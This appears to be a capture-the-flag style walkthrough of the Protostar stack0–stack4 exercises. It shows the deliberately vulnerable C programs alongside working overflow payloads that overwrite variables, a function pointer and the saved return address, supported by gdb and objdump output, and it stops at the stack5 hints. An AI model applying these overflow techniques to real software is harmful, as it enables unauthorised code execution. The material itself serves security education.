# From stack 0 - 7
## Stack 0
### About
This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0
#### Source
```cpp
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
As, first you can see there's a buffer overflow at `gets`, because `gets` doesn't limit user input length, which is really dangerous for attacker pwn over the system
```py
user@protostar:/opt/protostar/bin$ python -c "print 'a'*0x100" | ./stack0
you have changed the 'modified' variable
Segmentation fault
```
## Stack 1
### About
This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

#### Hints

If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
Protostar is little endian
#### Source
```cpp
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
Instead of using `gets`, this time the binary use `strcpy` to copy value from argument passed from cmd, but it still the same, because strcpy doesn't check input length. This time we need to change the value of `modified` to a specific value. The hint also mention that the machine itself is in little endian. so we need to carefully craft our padding to match the buffer length (which is 64 bytes), then we gonna pad "dcba" to it. Why? because `0x61626364` respectively standfor "abcd" in hex value, but since our machine is little endian, we need to reverse the order
```py
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print 'a'*0x40 + 'dcba'")
you have correctly got the variable to the right value
```
## Stack 2
### About
Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2

#### Source
```cpp
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
Just like the previous stack1, but this time it take input from environment variable. All we just need is use the same padding from stack1, then `export GREENIE= padding`.
```py
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

## Stack 3
### About
Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

#### Hints
 
both gdb and objdump is your friend you determining where the win() function lies in memory.
This level is at /opt/protostar/bin/stack3

#### Source
```cpp
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
In this challenge, we need to call `win` function, but how can you call it when the function does in main? Fortunately, there's a call `fp()`, because our buffer input is below `fp()`, we can overflow the `fp` with `win` function.

with `objdump` you can find the address of `win` function. Remember about little endian? just reverse the byte of win!


```py
user@protostar:/opt/protostar/bin$ objdump -dMintel stack3
...
08048424 <win>:
...
user@protostar:/opt/protostar/bin$ python -c "print 'a'*0x40 + '\x24\x84\x04\x08'" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack 4
### About
Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

#### Hints

A variety of introductory papers into buffer overflows may help.
gdb lets you do “run < input”
EIP is not directly after the end of buffer, compiler padding can also increase the size.

#### Source
```cpp
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Now, we don't have a `fp()`, so how can we possibly call `win`? Dig through the docs about buffer overflow, there will be a saved ebp, return address. In short the saved ebp keep track of the flow of the program in the stack, and return address is where it will return when a function call is done.

state of stack when finished a call:
```
+--------------+
|return address| 
+--------------+
|  saved ebp   | 
+--------------+
|..............|
|    buffer    |
|..............|
+--------------+
```
With that in mind let's debug it with gdb, you can see
```py
user@protostar:/opt/protostar/bin$ gdb stack4 -q
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   %ebp
0x08048409 <main+1>:    mov    %esp,%ebp
0x0804840b <main+3>:    and    $0xfffffff0,%esp
0x0804840e <main+6>:    sub    $0x50,%esp
0x08048411 <main+9>:    lea    0x10(%esp),%eax
0x08048415 <main+13>:   mov    %eax,(%esp)
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
(gdb) b*0x0804841d
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) r
Starting program: /opt/protostar/bin/stack4
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, main (argc=1, argv=0xbffff804) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) x/30xw $esp
0xbffff700:     0xbffff710      0xb7ec6165      0xbffff718      0xb7eada75
0xbffff710:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff720:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff730:     0x61616161      0x00616161      0x08048430      0xbffff758
0xbffff740:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffff750:     0x08048430      0x00000000      0xbffff7d8      0xb7eadc76
0xbffff760:     0x00000001      0xbffff804      0xbffff80c      0xb7fe1848
0xbffff770:     0xbffff7c0      0xffffffff
(gdb) x $ebp
0xbffff758:     0xbffff7d8
(gdb)
```
as you can see, 0x61616161 is our input `a`, and ebp is at 0xbffff758, which mean our return address is 0xbffff75c!

So now our job is done we pad our buffer up to ebp, then overwrite ret address with `win`.

I encountered weird error when redirect my input to gdb, so I took another approach to put my input into a file.

```py
Starting program: /opt/protostar/bin/stack4 < <(python -c "print 'a'*0x50 ")
/bin/sh: Syntax error: redirection unexpected
During startup program exited with code 2.
(gdb)
```
```py
user@protostar:/opt/protostar/bin$ python -c "print 'a'*0x4c + '\xf4\x83\x04\x08'" > /tmp/input.txt
```
```py
(gdb) r < /tmp/input.txt
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack4 < /tmp/input.txt
code flow successfully changed

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb)
```
## Stack 5
### About
Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

#### Hints

At this point in time, it might be easier to use someone elses shellcode
If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
remove the int3s once your shellcode is done.
